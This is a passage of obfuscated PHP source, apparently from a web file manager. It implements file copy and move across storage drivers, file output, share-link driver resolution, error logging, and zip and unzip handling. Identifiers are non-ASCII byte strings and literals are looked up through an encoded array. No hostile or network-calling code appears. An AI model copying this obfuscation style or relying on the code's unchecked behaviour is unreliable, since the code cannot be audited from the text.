$Çİ‰ÒŠ); } else { $íßï³Ê÷ = $¡‘“‡É–->copyFile($‘ÜÍ¬ƒ“, $Çİ‰ÒŠ); } Hook::trigger($°¢«¥Áì[1172], $çËç„şˆ, $‘ÜÍ¬ƒ“, $¡‘“‡É–, $Çİ‰ÒŠ, $ô“Ä»‡ş, $íßï³Ê÷); self::copyMoveKeepInfo($çËç„şˆ, $‘ÜÍ¬ƒ“, $íßï³Ê÷); return $íßï³Ê÷; } $¯Óş„” = TEMP_FILES; if ($GLOBALS[$°¢«¥Áì[6]][$°¢«¥Áì[89]][$°¢«¥Áì[804]]) { $¯Óş„” = $GLOBALS[$°¢«¥Áì[6]][$°¢«¥Áì[89]][$°¢«¥Áì[804]]; } $óÀç¶¦– = $¯Óş„”; mk_dir($óÀç¶¦–); $¯Í·Í® = $óÀç¶¦– . $ø•Œªµî; $æÑŒÓø = $¯Í·Í®; $¯Í·Í® = $çËç„şˆ->download($‘ÜÍ¬ƒ“, $¯Í·Í®); $¯Í·Í® = $çËç„şˆ->iconvApp($¯Í·Í®); if (substr($¯Í·Í®, strlen($¯Óş„”)) == $¯Óş„”) { $ÏŸŠ·˜Ğ = !0; } $íßï³Ê÷ = $¡‘“‡É–->upload($Çİ‰ÒŠ, $¯Í·Í®, $ÏŸŠ·˜Ğ); self::remove($æÑŒÓø); Hook::trigger($°¢«¥Áì[1172], $çËç„şˆ, $‘ÜÍ¬ƒ“, $¡‘“‡É–, $Çİ‰ÒŠ, $ô“Ä»‡ş, $íßï³Ê÷); self::copyMoveKeepInfo($çËç„şˆ, $‘ÜÍ¬ƒ“, $íßï³Ê÷); return $íßï³Ê÷; } private static function copyMoveKeepInfo($ª İĞÜ, $Š”‘­Ô³, $ù­¾Ğ…æ) { if (!$ù­¾Ğ…æ) { return; } $‹Ş‚ºíæ = $ª İĞÜ->info($Š”‘­Ô³); if (!is_array($‹Ş‚ºíæ)) { return; } IO::setModifyTime($ù­¾Ğ…æ, $‹Ş‚ºíæ[$_SERVER[şÒÁøÒÄ][85]]); } public static function pathFather($ï Íª•ç) { $Ï››óó = IO::init($ï Íª•ç); $ëêÖ–§ë = $Ï››óó->pathFather($Ï››óó->path); return $Ï››óó->getPathOuter($ëêÖ–§ë); } public static function fileOut($÷°—Ö£Š, $»ÜÄ­’° = false, $ëº¬€Ûğ = false, $Æƒİş…ƒ = '') { $ğ¹·Â’› = self::driverMake($÷°—Ö£Š); if ($ğ¹·Â’›->isFileOutServer()) { return $ğ¹·Â’›->fileOutServer($÷°—Ö£Š, $»ÜÄ­’°, $ëº¬€Ûğ, $Æƒİş…ƒ); } return $ğ¹·Â’›->fileOut($÷°—Ö£Š, $»ÜÄ­’°, $ëº¬€Ûğ, $Æƒİş…ƒ); } public static function fileOutImage($äÖøÅ×‡, $Ñ¥œ•Éã = 250) { $Ÿñ™İÓ = array(250, 600, 1200, 2000, 3000, 5000); for ($£ïÒúÒ¼ = 0; $£ïÒúÒ¼ < count($Ÿñ™İÓ); $£ïÒúÒ¼++) { if ($£ïÒúÒ¼ == 0 && $Ñ¥œ•Éã <= $Ÿñ™İÓ[$£ïÒúÒ¼]) { $Ñ¥œ•Éã = $Ÿñ™İÓ[$£ïÒúÒ¼]; break; } else { if ($Ñ¥œ•Éã > $Ÿñ™İÓ[$£ïÒúÒ¼ - 1] && $Ñ¥œ•Éã <= $Ÿñ™İÓ[$£ïÒúÒ¼]) { $Ñ¥œ•Éã = $Ÿñ™İÓ[$£ïÒúÒ¼]; break; } else { if ($£ïÒúÒ¼ == count($Ÿñ™İÓ) - 1 && $Ñ¥œ•Éã > $Ÿñ™İÓ[$£ïÒúÒ¼]) { $Ñ¥œ•Éã = $Ÿñ™İÓ[$£ïÒúÒ¼]; break; } } } } $ØŠÜèÈ = self::driverMake($äÖøÅ×‡); if ($ØŠÜèÈ->isFileOutServer()) { return $ØŠÜèÈ->fileOutImageServer($äÖøÅ×‡, $Ñ¥œ•Éã); } return $ØŠÜèÈ->fileOutImage($äÖøÅ×‡, $Ñ¥œ•Éã); } private static function driverIsSame($ü§Üô™¦, $ØÒ”ÙÙñ) { $¶¢õúô± =& $_SERVER[şÒÁøÒÄ]; $•Ğ‹‚ñ‰ = $ü§Üô™¦->getType(); $¾–¾Ö› = $ØÒ”ÙÙñ->getType(); if ($•Ğ‹‚ñ‰ != $¾–¾Ö›) { return !1; } if ($•Ğ‹‚ñ‰ == $¶¢õúô±[765]) { return !0; } if ($•Ğ‹‚ñ‰ == $¶¢õúô±[106]) { return !0; } if ($ü§Üô™¦->pathDriver == $ØÒ”ÙÙñ->pathDriver) { return !0; } return !1; } public static function copyUpdate($‰ÔÕÏ™Ş, $çÛÍ…˜ñ) { $ï‘é†üö =& $_SERVER[şÒÁøÒÄ]; if (!IO::exist($‰ÔÕÏ™Ş)) { return !1; } if (!IO::exist($çÛÍ…˜ñ)) { IO::mkdir($çÛÍ…˜ñ); } $êÓô¢èå = array_to_keyvalue(self::listAllSimple($‰ÔÕÏ™Ş), $ï‘é†üö[84]); $Øõ–¹à = array_to_keyvalue(self::listAllSimple($çÛÍ…˜ñ), $ï‘é†üö[84]); $Á“Û£Å® = array(); $­ÌÄÑ‰‰ = array(); foreach ($êÓô¢èå as $Å¯ÛÀüŸ => $Ô¡À¦) { if (isset($Øõ–¹à[$Å¯ÛÀüŸ])) { if ($Ô¡À¦[$ï‘é†üö[75]] == 1) { continue; } if ($Øõ–¹à[$Å¯ÛÀüŸ][$ï‘é†üö[76]] == $Ô¡À¦[$ï‘é†üö[76]]) { continue; } } if ($Ô¡À¦[$ï‘é†üö[75]] == 1) { $­ÌÄÑ‰‰[] = $çÛÍ…˜ñ . $ï‘é†üö[8] . trim($Å¯ÛÀüŸ, $ï‘é†üö[8]); continue; } $÷úùİäü = strstr(trim($Å¯ÛÀüŸ, $ï‘é†üö[8]), $ï‘é†üö[8]) ? get_path_father($Å¯ÛÀüŸ) : $ï‘é†üö[12]; $Á“Û£Å®[] = array($ï‘é†üö[1173] => $Ô¡À¦[$ï‘é†üö[86]], $ï‘é†üö[1174] => rtrim($çÛÍ…˜ñ, $ï‘é†üö[8]) . $ï‘é†üö[8] . $÷úùİäü, $ï‘é†üö[1175] => $Ô¡À¦); } $û¬âÔÓæ = array($ï‘é†üö[200] => $Á“Û£Å®, $ï‘é†üö[75] => $­ÌÄÑ‰‰); Hook::trigger($ï‘é†üö[1176], $‰ÔÕÏ™Ş, $çÛÍ…˜ñ, $û¬âÔÓæ); foreach ($­ÌÄÑ‰‰ as $Ô¡À¦) { IO::mkdir($Ô¡À¦); } foreach ($Á“Û£Å® as $Ô¡À¦) { IO::copy($Ô¡À¦[$ï‘é†üö[1173]], $Ô¡À¦[$ï‘é†üö[1174]], REPEAT_REPLACE); } } public static function fileSubstr($ª•á‘¹ç, $ó‰«ä¼è, $İíÏ•º¼ = false) { $‘„½¿€‚ =& $_SERVER[şÒÁøÒÄ]; $˜îŠÍ´£ = self::driverMake($ª•á‘¹ç); $°šĞŸ„“ = $˜îŠÍ´£->size($ª•á‘¹ç); $ëÌøûŸ = $ó‰«ä¼è; $î…³‚€É = $İíÏ•º¼; if ($ó‰«ä¼è < 0) { $ó‰«ä¼è = $°šĞŸ„“ + $ó‰«ä¼è; } if ($İíÏ•º¼ === !1) { $İíÏ•º¼ = $°šĞŸ„“ - $ó‰«ä¼è; } if ($ó‰«ä¼è + $İíÏ•º¼ > $°šĞŸ„“) { $İíÏ•º¼ = $°šĞŸ„“ - $ó‰«ä¼è; } if (!$°šĞŸ„“ && $˜îŠÍ´£->getType() == $‘„½¿€‚[106] && !$˜îŠÍ´£->exist($ª•á‘¹ç)) { $ã‹Ë”ú„ = get_path_this($ª•á‘¹ç); $§·€ñÅ‡ = parse_url_query($ã‹Ë”ú„); if (is_array($§·€ñÅ‡) && isset($§·€ñÅ‡[$‘„½¿€‚[32]])) { $ã‹Ë”ú„ = urldecode($§·€ñÅ‡[$‘„½¿€‚[32]]); } throw new Exception($‘„½¿€‚[1177] . LNG($‘„½¿€‚[1178]) . $‘„½¿€‚[979] . clear_html($ã‹Ë”ú„) . $‘„½¿€‚[12]); } if ($İíÏ•º¼ <= 0) { return $‘„½¿€‚[12]; } if ($ó‰«ä¼è < 0 || $ó‰«ä¼è >= $°šĞŸ„“ || $İíÏ•º¼ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\122\145\x61\144\x20\x65\x72\x72\x6f\x72\41\40\163\x74\x61\x72\164\x3d{$ó‰«ä¼è}\73\x6c\145\156\x67\x74\150\75{$İíÏ•º¼}\x3b\40\163\151\172\145\75{$°šĞŸ„“}\x3b"); } $³ˆ¤‡ÑÅ = $˜îŠÍ´£->fileSubstr($ª•á‘¹ç, $ó‰«ä¼è, $İíÏ•º¼); if (!$³ˆ¤‡ÑÅ && $İíÏ•º¼ && isset($GLOBALS[$‘„½¿€‚[1179]])) { throw new Exception($GLOBALS[$‘„½¿€‚[1179]][$‘„½¿€‚[1180]]); } return $³ˆ¤‡ÑÅ; } private static function driverMake(&$¶Šğ¦ö‹) { $Æ×Œ²Êú =& $_SERVER[şÒÁøÒÄ]; $¿¦ıûªº = KodIO::parse($¶Šğ¦ö‹); if (!self::$driverListSystem) { $ù¨šæÊ = Model($Æ×Œ²Êú[775])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ù¨šæÊ, $Æ×Œ²Êú[399]); } if ($¿¦ıûªº[$Æ×Œ²Êú[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¿¦ıûªº[$Æ×Œ²Êú[399]]]) { return !1; } $¶Šğ¦ö‹ = $¿¦ıûªº[$Æ×Œ²Êú[1181]]; $‰ÏöìÕ— = self::driverGet($¿¦ıûªº, $¶Šğ¦ö‹); return $‰ÏöìÕ—; } private static function driverGet($à›¨–Ç, &$êŸ¦¸®) { $•Å§ˆÕ¸ =& $_SERVER[şÒÁøÒÄ]; $ùÚæ´Êá = $à›¨–Ç[$•Å§ˆÕ¸[1182]]; $ø†å¤ñ = $à›¨–Ç[$•Å§ˆÕ¸[399]]; switch ($à›¨–Ç[$•Å§ˆÕ¸[33]]) { case KodIO::KOD_IO: $×¹‡äÓ = self::$driverListSystem[$ø†å¤ñ]; break; case KodIO::KOD_SOURCE: $êŸ¦¸® = $ø†å¤ñ . $êŸ¦¸®; $×¹‡äÓ = array($•Å§ˆÕ¸[1183] => $•Å§ˆÕ¸[1184], $•Å§ˆÕ¸[6] => $à›¨–Ç); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $®‚¿¿¨Ô = $GLOBALS[$•Å§ˆÕ¸[1185]]; self::$driverListUser = array_to_keyvalue($®‚¿¿¨Ô, $•Å§ˆÕ¸[399]); } $×¹‡äÓ = self::$driverListUser[$ø†å¤ñ]; break; case KodIO::KOD_SHARE_LINK: $×¹‡äÓ = array($•Å§ˆÕ¸[1183] => $•Å§ˆÕ¸[1186], $•Å§ˆÕ¸[6] => $à›¨–Ç); $Êô•‰¦” = Action($•Å§ˆÕ¸[1187])->sharePathInfo($à›¨–Ç[$•Å§ˆÕ¸[84]]); $êŸ¦¸® = $Êô•‰¦”[$•Å§ˆÕ¸[402]]; if (!$Êô•‰¦”[$•Å§ˆÕ¸[402]]) { $Ë‡Ãùç = Model($•Å§ˆÕ¸[592])->getInfo($Êô•‰¦”[$•Å§ˆÕ¸[593]]); $êŸ¦¸® = KodIO::clear($Ë‡Ãùç[$•Å§ˆÕ¸[1188]] . $à›¨–Ç[$•Å§ˆÕ¸[1181]]); $à›¨–Ç[$•Å§ˆÕ¸[486]] = $Ë‡Ãùç; $à›¨–Ç[$•Å§ˆÕ¸[1164]] = $êŸ¦¸®; $×¹‡äÓ = array($•Å§ˆÕ¸[1183] => $•Å§ˆÕ¸[1189], $•Å§ˆÕ¸[6] => $à›¨–Ç); } break; case KodIO::KOD_SHARE_ITEM: $×¹‡äÓ = array($•Å§ˆÕ¸[1183] => $•Å§ˆÕ¸[1190], $•Å§ˆÕ¸[6] => $à›¨–Ç); $Ë‡Ãùç = Model($•Å§ˆÕ¸[592])->getInfo($à›¨–Ç[$•Å§ˆÕ¸[399]]); if ($Ë‡Ãùç[$•Å§ˆÕ¸[402]] == $•Å§ˆÕ¸[198]) { $êŸ¦¸® = KodIO::clear($Ë‡Ãùç[$•Å§ˆÕ¸[1188]] . $à›¨–Ç[$•Å§ˆÕ¸[1181]]); $à›¨–Ç[$•Å§ˆÕ¸[486]] = $Ë‡Ãùç; $à›¨–Ç[$•Å§ˆÕ¸[1164]] = $êŸ¦¸®; $×¹‡äÓ = array($•Å§ˆÕ¸[1183] => $•Å§ˆÕ¸[1191], $•Å§ˆÕ¸[6] => $à›¨–Ç); } else { if (!$êŸ¦¸®) { $êŸ¦¸® = $Ë‡Ãùç[$•Å§ˆÕ¸[402]]; } } break; default: $êŸ¦¸® = $à›¨–Ç[$•Å§ˆÕ¸[84]]; $×¹‡äÓ = array($•Å§ˆÕ¸[1183] => $•Å§ˆÕ¸[1192]); break; } $ßäõŠŒ¹ = $à›¨–Ç[$•Å§ˆÕ¸[84]]; if (!isset(self::$driverCache[$ßäõŠŒ¹])) { $£ÌèÅÅ® = strtolower($×¹‡äÓ[$•Å§ˆÕ¸[95]]); $’¢şû‚í = $GLOBALS[$•Å§ˆÕ¸[6]][$•Å§ˆÕ¸[89]][$•Å§ˆÕ¸[834]]; $­¾åø§£ = $•Å§ˆÕ¸[74] . (isset($’¢şû‚í[$£ÌèÅÅ®]) ? $’¢şû‚í[$£ÌèÅÅ®] : ucfirst($£ÌèÅÅ®)); if (!class_exists($­¾åø§£)) { show_json("{$­¾åø§£}\40\x6e\157\x74\40\145\x78\151\163\164\x73\41", !1); } $£›¾Ü€² = isset($×¹‡äÓ[$•Å§ˆÕ¸[6]]) ? $×¹‡äÓ[$•Å§ˆÕ¸[6]] : !1; self::$driverCache[$ßäõŠŒ¹] = new $­¾åø§£($£›¾Ü€²); } $÷è¹ƒ†” = self::$driverCache[$ßäõŠŒ¹]; $÷è¹ƒ†”->pathDriver = $ùÚæ´Êá; $÷è¹ƒ†”->pathBase = $•Å§ˆÕ¸[12]; if (isset($×¹‡äÓ[$•Å§ˆÕ¸[6]][$•Å§ˆÕ¸[1193]])) { $÷è¹ƒ†”->pathBase = rtrim($×¹‡äÓ[$•Å§ˆÕ¸[6]][$•Å§ˆÕ¸[1193]], $•Å§ˆÕ¸[8]) . $•Å§ˆÕ¸[8]; $êŸ¦¸® = $÷è¹ƒ†”->pathBase . ltrim($êŸ¦¸®, $•Å§ˆÕ¸[8]); } $êŸ¦¸® = $÷è¹ƒ†”->getPath($êŸ¦¸®); if (isset($à›¨–Ç[$•Å§ˆÕ¸[1164]])) { $êŸ¦¸® = $à›¨–Ç[$•Å§ˆÕ¸[1164]]; } $÷è¹ƒ†”->path = $êŸ¦¸®; return $÷è¹ƒ†”; } public static function errorTips($äòçè¢Î = false) { $…öÖ°¯ =& $_SERVER[şÒÁøÒÄ]; static $ùî­«Š = array(); $‹ùò‡›ù = 1000; if ($äòçè¢Î === -1) { return $ùî­«Š ? $ùî­«Š[count($ùî­«Š) - 1] : $…öÖ°¯[12]; } if ($äòçè¢Î === !1) { return implode($…öÖ°¯[231], $ùî­«Š); } if (count($ùî­«Š) >= $‹ùò‡›ù) { $ùî­«Š = array_slice($ùî­«Š, $‹ùò‡›ù * 0.5, $‹ùò‡›ù); } $ùî­«Š[] = $äòçè¢Î; write_log($…öÖ°¯[162] . ACTION . $…öÖ°¯[1194] . $äòçè¢Î, $…öÖ°¯[1195]); } public static function getLastError($ø¨´ª…± = '') { $¿â¼å¤Ä = self::errorTips(-1); return $¿â¼å¤Ä ? $¿â¼å¤Ä : $ø¨´ª…±; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¸ô÷ïÁÕ; if ($¸ô÷ïÁÕ) { return $¸ô÷ïÁÕ; } $ßÜ¹† ô = IO::init($_SERVER[şÒÁøÒÄ][8]); return $ßÜ¹† ô; } private static function iconvSystem($îğ™Û·Å) { return self::local()->iconvSystem($îğ™Û·Å); } private static function iconvApp($È¨İªúÖ) { return self::local()->iconvApp($È¨İªúÖ); } public static function zipFolder($Ë¢—†ü, $È ˆŸ…Â = "\x7a\151\x70", $ÀíÛüÏÎ = '', $æö¶üì¯ = REPEAT_RENAME) { $ Ü›ÍÑŠ =& $_SERVER[şÒÁøÒÄ]; $°©ìî¹· = IO::listPath($Ë¢—†ü); if (!$°©ìî¹·) { return !1; } $°©ìî¹· = array_merge($°©ìî¹·[$ Ü›ÍÑŠ[82]], $°©ìî¹·[$ Ü›ÍÑŠ[83]]); return self::zip($°©ìî¹·, $È ˆŸ…Â, $ÀíÛüÏÎ, $æö¶üì¯); } public static function zip($ØÃ¾äéä, $şâ¶Öü = "\172\151\160", $ÔŠÈø¢¦ = '', $Êç¶İÆÆ = REPEAT_RENAME) { $‚µË·§• =& $_SERVER[şÒÁøÒÄ]; if (is_string($ØÃ¾äéä) && $ØÃ¾äéä) { $ØÃ¾äéä = array(array($‚µË·§•[84] => $ØÃ¾äéä)); } $¤ó‚÷¼ = self::init($ØÃ¾äéä[0][$‚µË·§•[84]]); $é…ŒşÌ¢ = self::info($ØÃ¾äéä[0][$‚µË·§•[84]]); $ÎÀ¶â²Æ = $‚µË·§•[12]; $šˆ±Ñ¶º = $‚µË·§•[12]; $”ÒöŸş = $‚µË·§•[12]; if ($ÔŠÈø¢¦ && substr($ÔŠÈø¢¦, -1, 1) != $‚µË·§•[8]) { $šˆ±Ñ¶º = get_path_father($ÔŠÈø¢¦); $”ÒöŸş = get_path_this($ÔŠÈø¢¦); } else { $šˆ±Ñ¶º = self::pathFather($é…ŒşÌ¢[$‚µË·§•[84]]); $”ÒöŸş = $é…ŒşÌ¢[$‚µË·§•[32]] . $‚µË·§•[10] . $şâ¶Öü; if (count($ØÃ¾äéä) > 1) { $À÷¬à‘¯ = IO::info($šˆ±Ñ¶º); $”ÒöŸş = $À÷¬à‘¯[$‚µË·§•[32]] . $‚µË·§•[10] . $şâ¶Öü; } if ($ÔŠÈø¢¦) { $šˆ±Ñ¶º = $ÔŠÈø¢¦; } } if ($¤ó‚÷¼->getType() == $‚µË·§•[106]) { $ï³³àóî = self::init($šˆ±Ñ¶º); $•ı–­úª = $ï³³àóî->getType() == $‚µË·§•[106] ? $šˆ±Ñ¶º : get_path_father($¤ó‚÷¼->path); $•ı–­úª = rtrim($•ı–­úª, $‚µË·§•[8]) . $‚µË·§•[8]; mk_dir($•ı–­úª); } else { $ÎÀ¶â²Æ = TEMP_FILES . $‚µË·§•[1196] . time() . rand_string(8) . $‚µË·§•[8]; mk_dir($ÎÀ¶â²Æ); file_put_contents($ÎÀ¶â²Æ . $‚µË·§•[1197], $‚µË·§•[12]); $•ı–­úª = $ÎÀ¶â²Æ; } $ô¾âÃ„Œ = IO::info($•ı–­úª); if (!$ô¾âÃ„Œ || !$ô¾âÃ„Œ[$‚µË·§•[203]]) { show_json(LNG($‚µË·§•[1198]), !1); } $ÉÒ¬ÑË¡ = self::zipFileList($ØÃ¾äéä, $ÎÀ¶â²Æ); foreach ($ÉÒ¬ÑË¡ as $Æ¼Ö„”è => $Î±” ¬) { $ÉÒ¬ÑË¡[$Æ¼Ö„”è] = self::iconvSystem($Î±” ¬); } $©­Òëã = get_filename_auto($•ı–­úª . $”ÒöŸş, $‚µË·§•[12], $Êç¶İÆÆ); KodArchive::create(self::iconvSystem($©­Òëã), $ÉÒ¬ÑË¡); if (!IO::exist($©­Òëã)) { if ($ÎÀ¶â²Æ) { del_dir($ÎÀ¶â²Æ); } show_json(LNG($‚µË·§•[1199]), !1); } if (!$ÎÀ¶â²Æ) { return $©­Òëã; } $ı¡­Íœú = self::move($©­Òëã, $šˆ±Ñ¶º, $Êç¶İÆÆ); if ($ÎÀ¶â²Æ) { del_dir($ÎÀ¶â²Æ); } if (!$©­Òëã) { show_json(LNG($‚µË·§•[1199]), !1); } return $ı¡­Íœú; } public static function unzip($øÍ·ùÓ¸, $ô‚¶üÚ–, $İ°™À¥á = "\x2d\61", $Ş§¸Õï“ = "\x72\145\160\x6c\x61\143\145") { $¶¨£ç¦¶ =& $_SERVER[şÒÁøÒÄ]; $«º÷‡â„ = parent::info($øÍ·ùÓ¸); if (!$«º÷‡â„) { show_json(LNG($¶¨£ç¦¶[1200]), !1); } $ñãîâ¡ = IO::infoFull($ô‚¶üÚ–); if (!$ñãîâ¡) { $ô‚¶üÚ– = IO::mkdir($ô‚¶üÚ–); } if (isset($ñãîâ¡[$¶¨£ç¦¶[402]]) && trim($ñãîâ¡[$¶¨£ç¦¶[84]], $¶¨£ç¦¶[8]) != trim($ô‚¶üÚ–, $¶¨£ç¦¶[8])) { $ùÈ„ëå = KodIO::make($ñãîâ¡[$¶¨£ç¦¶[432]]); $Í‘“¢µú = IO::fileNameAuto($ùÈ„ëå, $ñãîâ¡[$¶¨£ç¦¶[32]], REPEAT_RENAME_FOLDER, !0); $ô‚¶üÚ– = IO::mkdir($ùÈ„ëå . $Í‘“¢µú); } $İ°™À¥á = $İ°™À¥á && $İ°™À¥á != $¶¨£ç¦¶[1201] ? @json_decode($İ°™À¥á, !0) : -1; $™í²µ™Ò = self::unzipPart($øÍ·ùÓ¸, $İ°™À¥á); if (!$™í²µ™Ò || !IO::exist($™í²µ™Ò[$¶¨£ç¦¶[200]])) { show_json(LNG($¶¨£ç¦¶[105]), !1); } $ùªÁÑø´ = $™í²µ™Ò[$¶¨£ç¦¶[1202]][count($™í²µ™Ò[$¶¨£ç¦¶[1202]]) - 1]; if ($ùªÁÑø´[$¶¨£ç¦¶[1203]] == -1 || substr($ùªÁÑø´[$¶¨£ç¦¶[32]], -1, 1) == $¶¨£ç¦¶[8]) { $„Ö‹©†´ = $™í²µ™Ò[$¶¨£ç¦¶[1204]] . rand_string(10) . $¶¨£ç¦¶[8]; mk_dir($„Ö‹©†´); $Û»°ˆëñ = count($™í²µ™Ò[$¶¨£ç¦¶[1202]]) == 1 ? IO::ext($øÍ·ùÓ¸) : get_path_ext($™í²µ™Ò[$¶¨£ç¦¶[200]]); $òã¶Ï£Á = KodArchive::extract(self::iconvSystem($™í²µ™Ò[$¶¨£ç¦¶[200]]), $„Ö‹©†´, $ùªÁÑø´[$¶¨£ç¦¶[1203]], $Í‘“¢µú, $Û»°ˆëñ); self::unzipErrorCheck($òã¶Ï£Á, array($¶¨£ç¦¶[1205], $øÍ·ùÓ¸, $Û»°ˆëñ, $ô‚¶üÚ–, $™í²µ™Ò)); Hook::trigger($¶¨£ç¦¶[1206], $„Ö‹©†´); recursion_dir($„Ö‹©†´, $üÑˆˆªğ, $¾áøä·•, 0); $ó‰›“¤ = array_merge($üÑˆˆªğ, $¾áøä·•); $“ËÃ«èÂ = array(); foreach ($ó‰›“¤ as $Ê·ŒÓŞõ) { $¥áëï¶ü = IO::move(self::iconvApp($Ê·ŒÓŞõ), $ô‚¶üÚ–, $Ş§¸Õï“); if ($¥áëï¶ü) { $“ËÃ«èÂ[] = $¥áëï¶ü; } } del_dir($„Ö‹©†´); } else { $¥áëï¶ü = IO::move($™í²µ™Ò[$¶¨£ç¦¶[200]], $ô‚¶üÚ–, $Ş§¸Õï“, get_path_this($ùªÁÑø´[$¶¨£ç¦¶[32]])); if ($¥áëï¶ü) { $“ËÃ«èÂ[] = $¥áëï¶ü; } } return $“ËÃ«èÂ ? $“ËÃ«èÂ : !1; } public static function unzipList($ãû´„îÉ) { $êô…„ÇÕ =& $_SERVER[şÒÁøÒÄ]; $É¹˜˜ùö = isset($ãû´„îÉ[$êô…„ÇÕ[1207]]) ? $ãû´„îÉ[$êô…„ÇÕ[1207]] : !1; $¼Ô‚©Á = isset($ãû´„îÉ[$êô…„ÇÕ[1203]]) ? @json_decode($ãû´„îÉ[$êô…„ÇÕ[1203]], !0) : -1; $ü±Ôøº¸ = self::unzipPart($ãû´„îÉ[$êô…„ÇÕ[84]], $¼Ô‚©Á); if (!$ü±Ôøº¸ || !IO::exist($ü±Ôøº¸[$êô…„ÇÕ[200]])) { show_json(LNG($êô…„ÇÕ[105]), !1); } $õ†İÒû¿ = $ü±Ôøº¸[$êô…„ÇÕ[1202]][count($ü±Ôøº¸[$êô…„ÇÕ[1202]]) - 1]; $ÏÒÑà›§ = in_array(IO::ext($ü±Ôøº¸[$êô…„ÇÕ[200]]), array($êô…„ÇÕ[313], $êô…„ÇÕ[1208], $êô…„ÇÕ[1209], $êô…„ÇÕ[1210], $êô…„ÇÕ[1211], $êô…„ÇÕ[1212])); if (!$É¹˜˜ùö && ($õ†İÒû¿[$êô…„ÇÕ[1203]] == -1 || $ÏÒÑà›§)) { $‰¬Èì”¿ = $ü±Ôøº¸[$êô…„ÇÕ[1204]] . get_path_this($ü±Ôøº¸[$êô…„ÇÕ[200]]) . $êô…„ÇÕ[1213]; if (!IO::exist($‰¬Èì”¿)) { $§×¹¹¿Ä = $õ†İÒû¿[$êô…„ÇÕ[1203]] == -1 ? get_path_ext(IO::pathThis($ãû´„îÉ[$êô…„ÇÕ[84]])) : get_path_ext($ü±Ôøº¸[$êô…„ÇÕ[200]]); $§ŒÃ²ºû = KodArchive::listContent(self::iconvSystem($ü±Ôøº¸[$êô…„ÇÕ[200]]), !0, $§×¹¹¿Ä); self::unzipErrorCheck($§ŒÃ²ºû, array($êô…„ÇÕ[1214], $ãû´„îÉ, $ü±Ôøº¸)); @file_put_contents($‰¬Èì”¿, json_encode($§ŒÃ²ºû[$êô…„ÇÕ[1215]])); } return @json_decode(IO::getContent($‰¬Èì”¿), !0); } IO::fileOut($ü±Ôøº¸[$êô…„ÇÕ[200]], $É¹˜˜ùö, get_path_this($õ†İÒû¿[$êô…„ÇÕ[32]])); die; } private static function zipFileList($ôµÓÅ¶Õ, $¥´™¯İĞ = false) { $ÊÉú¾ =& $_SERVER[şÒÁøÒÄ]; $óÌˆÜ‹ = array(); foreach ($ôµÓÅ¶Õ as $ú¢Œ) { $Ï ”Ë§— = $ú¢Œ[$ÊÉú¾[84]]; if ($¥´™¯İĞ) { $Ï ”Ë§— = self::copy($ú¢Œ[$ÊÉú¾[84]], $¥´™¯İĞ, $ÊÉú¾[826]); } else { $ÍÀ´›Å = self::init($ú¢Œ[$ÊÉú¾[84]]); if ($ÍÀ´›Å->getType() == $ÊÉú¾[106]) { $Ï ”Ë§— = $ÍÀ´›Å->path; } } if ($Ï ”Ë§— && self::local()->exist($Ï ”Ë§—)) { $óÌˆÜ‹[$ú¢Œ[$ÊÉú¾[84]]] = $Ï ”Ë§—; } } if (!empty($óÌˆÜ‹)) { return array_values($óÌˆÜ‹); } show_json(LNG($ÊÉú¾[1178]), !1); } private static function localFilePath($¢ËîÁàæ) { $ØØ†É¾ =& $_SERVER[şÒÁøÒÄ]; $ô¢È±ŠÉ = KodIO::parse($¢ËîÁàæ); if ($ô¢È±ŠÉ[$ØØ†É¾[33]] == KodIO::KOD_SOURCE) { $şäÓùö = Model($ØØ†É¾[833])->fileInfoGet(KodIO::sourceID($¢ËîÁàæ)); if (!$şäÓùö[$ØØ†É¾[84]]) { show_json($ØØ†É¾[1216], !1); } $¢ËîÁàæ = $şäÓùö[$ØØ†É¾[84]]; } $á÷‰üàŠ = self::init($¢ËîÁàæ); if ($á÷‰üàŠ->pathParse[$ØØ†É¾[1164]]) { $¢ËîÁàæ = $á÷‰üàŠ->pathParse[$ØØ†É¾[1164]]; $á÷‰üàŠ = self::init($¢ËîÁàæ); } $•“Ñî°î = $á÷‰üàŠ->getType(); if ($•“Ñî°î == $ØØ†É¾[106] || $•“Ñî°î == $ØØ†É¾[1217]) { if (!$á÷‰üàŠ->exist($á÷‰üàŠ->path)) { show_json(LNG($ØØ†É¾[105]), !1); } return $á÷‰üàŠ->path; } return !1; } public static function unzipPart($ÙÒÕñéî, $˜Í‚‡ùÓ = -1) { $ã…“’õß =& $_SERVER[şÒÁøÒÄ]; $¡“è¦§„ = IO::pathThis($ÙÒÕñéî); if (!$˜Í‚‡ùÓ || $˜Í‚‡ùÓ == -1) { $ò³Š§› = array(array($ã…“’õß[32] => $¡“è¦§„, $ã…“’õß[1203] => -1)); $ò³Š§›[0][$ã…“’õß[1218]] = $ò³Š§›[0][$ã…“’õß[32]]; } else { if (is_array($˜Í‚‡ùÓ)) { $ò³Š§› = $˜Í‚‡ùÓ; $·İãˆ« = count($ò³Š§›) - 1; for ($¿ùóâü = 0; $¿ùóâü <= $·İãˆ«; $¿ùóâü++) { $ŞäüŠÄ = $ò³Š§›[$¿ùóâü]; $¾•İ—Ü– = get_path_this($ŞäüŠÄ[$ã…“’õß[32]]) . (checkExtSafe($ŞäüŠÄ[$ã…“’õß[32]]) ? $ã…“’õß[12] : $ã…“’õß[1219]); $ò³Š§›[$¿ùóâü][$ã…“’õß[1218]] = $ã…“’õß[1220] . intval($ŞäüŠÄ[$ã…“’õß[1203]]) . $ã…“’õß[386] . $¾•İ—Ü–; if ($¿ùóâü == 0) { continue; } $ò³Š§›[$¿ùóâü][$ã…“’õß[1218]] = $ò³Š§›[$¿ùóâü - 1][$ã…“’õß[1218]] . $ã…“’õß[1221] . $ò³Š§›[$¿ùóâü][$ã…“’õß[1218]]; } } } if (!is_array($ò³Š§›) || count($ò³Š§›) == 0) { return !1; } $Ñ˜…¨„Ú = $ò³Š§›[count($ò³Š§›) - 1]; if (!IO::exist($ÙÒÕñéî)) { return !1; } $ÒÎ¯ °‰ = TEMP_FILES . $ã…“’õß[1222] . kodIO::hashPathSafe($ÙÒÕñéî) . $ã…“’õß[8]; $„–ÂÃ¨¥ = $ÒÎ¯ °‰ . $Ñ˜…¨„Ú[$ã…“’õß[1218]]; mk_dir($ÒÎ¯ 